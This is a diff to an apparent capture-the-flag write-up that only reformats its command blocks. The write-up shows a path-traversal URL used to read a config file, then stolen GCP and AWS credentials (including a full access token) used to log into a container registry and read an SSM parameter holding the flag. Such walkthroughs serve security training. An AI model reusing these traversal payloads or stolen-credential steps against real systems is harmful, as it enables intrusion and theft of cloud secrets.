@@ -59,19 +59,21 @@ http://159.65.106.65/index.php?file=..././..././..././..././..././..././home/aut
 Now that the config.json is in our possession, it is possible to authenticate to Gcloud:
 
 ```
-# gcloud auth activate-service-account --key-file config.json
+gcloud auth activate-service-account --key-file config.json
+
 Activated service account credentials for: [recon-container@recon-285218.iam.gserviceaccount.com]
 ```
 
 You can then print out the token, and pass it to Docker in order to login.
 
 ```
-# gcloud auth print-access-token
+gcloud auth print-access-token
+
 ya29.c.KpYB1wcWhYrCYdx32EhocOMjGFl37QzHAwsaTblYBN6IKBuuD06g7uZMf2ZZKC4q1mFBaK5NZEUlNCa4hmN4znB4UD3nk2nJbcmQwMta7mtot_F26gH1h0OYr4Gp2_9tuO4FjsJzkHWVjmkB4hjcyKZ7PvXtH1SllKRCE43gQXofzGwVGnyI1FrmO3kVAntpndVgxODMk8mO
 ```
 
 ```
-# docker login -u oauth2accesstoken -p "ya29.c.KpYB1wcWhYrCYdx32EhocOMjGFl37QzHAwsaTblYBN6IKBuuD06g7uZMf2ZZKC4q1mFBaK5NZEUlNCa4hmN4znB4UD3nk2nJbcmQwMta7mtot_F26gH1h0OYr4Gp2_9tuO4FjsJzkHWVjmkB4hjcyKZ7PvXtH1SllKRCE43gQXofzGwVGnyI1FrmO3kVAntpndVgxODMk8mO" https://gcr.io/recon-285218/recon-code
+ docker login -u oauth2accesstoken -p "ya29.c.KpYB1wcWhYrCYdx32EhocOMjGFl37QzHAwsaTblYBN6IKBuuD06g7uZMf2ZZKC4q1mFBaK5NZEUlNCa4hmN4znB4UD3nk2nJbcmQwMta7mtot_F26gH1h0OYr4Gp2_9tuO4FjsJzkHWVjmkB4hjcyKZ7PvXtH1SllKRCE43gQXofzGwVGnyI1FrmO3kVAntpndVgxODMk8mO" https://gcr.io/recon-285218/recon-code
 ```
 
 Now that we are authenticated, the Docker image can be pulled:
@@ -140,7 +142,7 @@ index 3d7addf..0f47c02 100644
 Now taking these keys and using it with aws-cli tools, we can query AWS to determine what these credentials are for.
 
 ```json
-# aws sts get-caller-identity
+aws sts get-caller-identity
 {
     "UserId": "AIDAXMXLEAVVNPZ2QUKVR",
     "Account": "508372977002",
@@ -151,7 +153,7 @@ Now taking these keys and using it with aws-cli tools, we can query AWS to deter
 Looking at the "read-param" username, it's a good bet that this key pair had some kind of read privileges for parameters in AWS SSM. Taking a look at the parameters present reveals  "/prod/ctf/flag".
 
 ```json
-# aws ssm describe-parameters --region us-east-1
+aws ssm describe-parameters --region us-east-1
 {
     "Parameters": [
         {
@@ -170,7 +172,7 @@ Looking at the "read-param" username, it's a good bet that this key pair had som
 A final query can then be made to read the parameter, which at long last gives the flag!
 
 ```json
-# aws ssm get-parameters --name /prod/ctf/flag --region us-east-1
+aws ssm get-parameters --name /prod/ctf/flag --region us-east-1
 {
     "Parameters": [
         {
